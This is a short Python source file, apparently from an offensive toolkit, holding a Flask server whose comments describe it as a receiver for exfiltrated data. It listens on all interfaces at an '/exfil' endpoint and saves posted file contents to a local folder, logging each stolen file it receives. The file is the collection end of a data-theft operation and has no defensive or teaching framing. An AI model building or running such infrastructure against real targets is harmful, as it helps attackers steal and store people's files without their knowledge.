# server/default_exfil_server.py
# Simple Flask server to receive exfiltrated data
# Requires: pip install flask

from flask import Flask, request, jsonify
import os

app = Flask(__name__)

SAVE_DIR = "received_logs"
os.makedirs(SAVE_DIR, exist_ok=True)

@app.route('/exfil', methods=['POST'])
def receive():
    data = request.get_json()
    if not data:
        return jsonify({"status": "error", "message": "No JSON received"}), 400

    filename = data.get("filename", "unknown.txt")
    content = data.get("content", "")

    safe_path = os.path.join(SAVE_DIR, os.path.basename(filename))
    with open(safe_path, "a") as f:
        f.write(content + "\n")

    print("="*50)
    print(f"[+] Received file: {filename}")
    print(f"[+] Saved to: {safe_path}")
    print("="*50)

    return jsonify({"status": "success", "message": "Data received"}), 200

if __name__ == "__main__":
    print("[*] Listening for exfiltration on http://localhost:8000/exfil")
    app.run(host="0.0.0.0", port=8000)